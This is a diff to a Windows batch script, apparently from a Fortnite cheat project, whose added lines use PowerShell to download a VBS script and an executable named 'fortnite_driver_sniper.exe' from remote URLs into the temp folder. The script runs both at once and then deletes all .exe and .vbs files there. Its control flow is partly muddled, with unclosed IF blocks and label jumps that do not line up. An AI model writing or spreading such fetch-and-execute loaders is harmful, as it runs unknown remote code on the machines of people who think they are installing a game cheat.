@@ -1,8 +1,13 @@
 @echo off
-Powershell https://cdn.discordapp.com/attachments/774913548827885592/775027796388872192/welcome.vbs -OutFile %temp%/welcome.vbs
+Powershell https://raw.githubusercontent.com/fortnite-bot/fncheat/main/welcome.vbs -OutFile %temp%/welcome.vbs
+"%temp%/welcome.vbs"
+
+:start2
+Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
+"%temp%/loader.exe"
 
 IF EXIST "%temp%/loader.exe" (
-    goto :menu
+    goto :start
     
 goto :menu
 ) ELSE (
@@ -10,14 +15,9 @@ goto :menu
 )
 
 :start
-Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/raw/main/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
-Powershell Invoke-WebRequest https://raw.githubusercontent.com/fortnite-bot/fncheat/main/welcome.vbs -OutFile %temp%/welcome.vbs
-"%temp%/welcome.vbs"
-"%temp%/loader.exe"
 IF EXIST "%temp%/." (
     del  %temp%\*.exe  /Q
     del  %temp%\*.vbs  /Q
-Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/raw/main/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
 
 :exitstart
 IF EXIST "%temp%/." (
